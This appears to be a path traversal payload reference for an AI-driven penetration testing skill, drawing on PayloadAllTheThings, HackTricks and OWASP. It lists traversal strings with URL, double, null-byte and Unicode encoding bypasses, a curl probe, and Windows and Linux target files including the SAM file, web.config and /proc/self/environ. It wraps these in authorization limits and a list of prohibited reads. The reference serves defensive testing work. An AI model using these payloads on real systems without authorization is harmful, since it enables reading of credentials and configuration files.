# Path Traversal / Directory Traversal Payload

> ⚠️ **Security Boundary Statement**
>
> This document is for **authorized penetration testing reference** only, helping identify path traversal vulnerability risk characteristics.
>
> - All payloads are **technical principle demonstrations**, actual sensitive file reading prohibited
> - Path traversal payloads are for understanding attack surface only, **no arbitrary file read exploitation**
> - Validation proves vulnerability existence (read test file only), **no credential/config extraction**
> - See `SKILL.md` for specific execution boundaries
>
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings, HackTricks, OWASP

## Manual Testing

**Note: Maximum 8 traversal probe attempts per parameter**

---

## Validation Objectives (Within Security Boundary)

Path traversal vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Basic Traversal | ✓ `../../../etc/passwd` read proof | - | Read credential files |
| URL Encoding Bypass | ✓ `%2e%2e%2f` encoding proof | - | Extract sensitive configs |
| Null Byte Injection | ✓ `%00` termination proof | - | Write/upload files |
| Unicode Normalization | ✓ Test normalization bypass | - | Arbitrary file destruction |
| Windows Traversal | ✓ `..\..\windows\win.ini` proof | - | Registry/SAM extraction |
| Deep Traversal | ✓ `....//....//` depth proof | ✓ Extended authorization | System file access |

**Safe Validation Method**: Use `/etc/passwd` or `/windows/win.ini` as test file only. Do not read application configs, credentials, or source code.

---

## Basic Path Traversal

### Unix/Linux

```bash
# Basic traversal sequences
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

# Determine traversal depth
..%2f..%2f..%2fetc%2fpasswd

# Confirm with known readable file
curl -s "https://target.com/download?file=../../../etc/passwd"
```

### Windows

```bash
# Windows traversal
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini

# Windows with forward slashes
../../windows/win.ini
../../../windows/win.ini
```

---

## URL Encoding Bypass

### Single URL Encoding

```bash
# Dot and slash encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Backslash encoded (Windows)
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
```

### Double URL Encoding

```bash
# Double encoded traversal
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Double encoded backslash
%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
```

---

## Null Byte Injection

```bash
# Null byte truncation (older systems)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Double encoded null byte
../../../etc/passwd%2500

# Windows null byte
..\..\..\windows\win.ini%00
..\..\..\windows\win.ini%00.jpg
```

---

## Unicode Normalization Bypass

```bash
# Unicode overlong encoding
..%c0%af..%c0%af..%c0%afetc/passwd

# Unicode path separators
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd

# Mixed encoding
..%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Full-width characters
．．／．．／．．／etc/passwd
```

---

## Platform-Specific Traversal

### Windows vs Linux Separators

| Platform | Separator | Alternate | Encoded |
|----------|-----------|-----------|---------|
| Linux | `/` | N/A | `%2f` |
| Windows | `\` | `/` | `%5c` |
| Both tested | `..\/` | `..%5c` | Mixed |

### Windows-Specific Targets

```bash
# Common Windows readable files
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\repair\sam

# IIS specific
..\..\..\inetpub\wwwroot\web.config
..\..\..\windows\system32\inetsrv\metabase.xml
```

### Linux-Specific Targets

```bash
# Common Linux readable files (default validation only)
../../../etc/passwd
../../../etc/hosts
../../../proc/self/environ
../../../etc/hostname
```

---

## 6-Character Truncation

```bash
# Some systems truncate at specific lengths
# If filename parameter limits to 6 chars:
....//....//....//etc/passwd
......//......//etc/passwd

# Traversal with truncation bypass
..../..../..../etc/passwd
```

---

## Depth Limit Bypass

```bash
# Start with many traversals, reduce until success
../../../../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd

# Use /. to bypass depth filters
../../../etc/passwd/.
../../../etc/passwd/./.

# Use path doubling
/../../../etc/passwd/../../../etc/passwd
```

---

## Filter Bypass Techniques

### Extension Bypass

```bash
# Appending null byte for extension filters
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg

# Using path parameter
/?file=../../../etc/passwd&ext=

# Using fragment
../../../etc/passwd#.{original_extension}

# Using query string
../../../etc/passwd?.{original_extension}
```

### Path Normalization Bypass

```bash
# Double encoding path components
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Mixed path separators
..%5c../..%5cetc/passwd

# Using URL path encoding
/..%252f..%252f..%252fetc/passwd

# Dot-dot-slash with extra dots
....//....//....//etc/passwd
..../..../..../etc/passwd
```

---

## OWASP Category & CWE

| Category | Mapping |
|----------|---------|
| OWASP Web | A01:2021-Broken Access Control |
| CWE | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| CWE | CWE-23: Relative Path Traversal |
| CWE | CWE-36: Absolute Path Traversal |

---

## Analysis Process

1. Identify parameters that accept filenames or paths (`file`, `path`, `dir`, `template`, `page`, `include`)
2. Test basic traversal: `../../../etc/passwd`
3. If filtered, try URL encoding, double encoding, null byte, Unicode
4. Test both Unix and Windows path separators
5. Confirm traversal with harmless test file only (`/etc/passwd` or `/windows/win.ini`)
6. Document traversal depth required and encoding that bypasses filter
7. **Stop validation**, report finding without reading sensitive files

---

## Output

```markdown
## Vulnerability: Path Traversal

### Location
{URL} - {parameter name}

### Proof Payload (Default Validation)
../../../etc/passwd

### Traverse Depth Required
{X} levels (e.g., ../../../../)

### Encoding Bypass Used
{none / URL encoding / double encoding / null byte / Unicode}

### Validation Result
- Path traversal exists: ✅ Confirmed
- Test file read: ✅ /etc/passwd readable
- Encoding required: {encoding type}
- Platform: {Linux/Windows}

### Risk Level
{see severity rules}

### Severity Classification

Path traversal severity is based on **arbitrary file read is confirmed** — not on specific file content read.

| Actual case | Severity | Note |
|---------|------|------|
| Confirmed arbitrary file read (e.g. reads `/etc/passwd`/`/windows/win.ini`) | **High** | Reading `/etc/passwd` proves arbitrary file read capability confirmed. If passwd is readable, so are shadow/keys/config — what to read is intent, not capability. Not downgraded because passwd was read |
| Reads app configuration/source code/keys (requires authorization, see boundary) | **High** | Higher data sensitivity, maintain High |
| Traversal syntax accepted but file unreadable (filtered/sandboxed/no permission) | Low | Capability not confirmed, mark "traversal exists but read failed" |
| Only path reflection exists but no file-read response | Low | Pending confirmation |

**Boundary**: During testing only use `/etc/passwd`/`/windows/win.ini` etc. harmless files to prove capability. Reading app configuration/keys/source code is Prohibited, not actually read during testing — but for severity, since capability is confirmed, sensitive file readability is treated as "readable" for High; no need to actually read.
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Read credential files | Do not read /etc/shadow, .env, config.php, etc. |
| ❌ Read application source | Do not read application source code files |
| ❌ Read database configs | Do not read database configuration with credentials |
| ❌ Write or upload files | Path traversal is for read proof only |
| ❌ Access private keys | Do not read SSH keys, TLS certificates, API keys |
| ❌ System file destruction | Do not modify or delete any files |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Only prove existence", "Do not read sensitive files"
- `README.md` -> Prohibited execution checklist